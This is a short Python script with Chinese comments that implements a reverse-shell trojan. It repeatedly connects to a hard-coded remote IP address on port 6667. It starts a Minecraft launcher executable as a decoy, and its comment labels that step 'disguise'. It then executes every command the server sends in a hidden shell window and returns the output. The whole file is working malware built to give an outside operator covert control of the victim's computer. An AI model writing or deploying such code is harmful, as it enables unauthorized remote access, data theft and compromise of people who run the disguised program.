import subprocess
import socket
import threading

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接服务器
server_address = ('45.77.35.154', 6667)  #
while True:
    try:
        client_socket.connect(server_address)
        break
    except:
        pass

#伪装
def task1():
    subprocess.call("Plain Craft Launcher 2.exe")
#操作
def task2():
    while True:
        try:
            data = client_socket.recv(4096).decode()
            print(data)
            command=data
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
            stdout, stderr = process.communicate()
            return_code = process.returncode
            client_socket.send(('[client]\n'+f"Return code: {return_code}\n"+f"Standard output:\n{stdout}\n"+ f"Standard error:\n{stderr}\n").encode())
        except:
            client_socket.send('[error]'.encode())
            continue
thread1 = threading.Thread(target=task1)
thread2 = threading.Thread(target=task2)
thread1.start()
thread2.start()









